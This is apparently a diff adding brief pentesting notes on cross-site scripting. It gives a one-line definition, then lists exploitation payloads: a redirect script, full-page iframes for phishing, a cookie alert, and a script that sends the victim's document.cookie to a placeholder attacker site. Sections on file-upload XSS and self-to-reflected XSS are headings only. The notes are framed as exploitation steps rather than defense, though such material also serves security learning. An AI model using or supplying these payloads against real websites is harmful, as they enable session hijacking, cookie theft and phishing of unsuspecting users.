@@ -1,0 +1,42 @@
+xss through header parameter
+
+vulnerability name : cross site scripting
+
+vulnerability description : xss are a type of injection , in which malicious scripts are injected into otherwise benign and
+ trusted web sites. xss attacks occur when an attacker uses a web application to send code , generally 
+in the form of a browser side script, to a different end user
+
+#=============================================================================
+
+exploitation of xss phishing
+
+1. document.location.href="website"
+
+2.phishing advance
+
+<iframe src="website"></iframe>
+
+<iframe src="website" height="100%" width="100%" ></iframe>
+
+3.cookie stealing xss
+
+<script>alert(document.cookie)</script>
+
+previous attack give cookie as popup
+
+<script>document.location.href="our_website"+document.cookie</script>
+
+this give cookie of client
+
+#==============================================================================
+
+xss through file upload
+
+#==========================================================================
+
+convert self xss to reflected xss
+
+
+
+
+
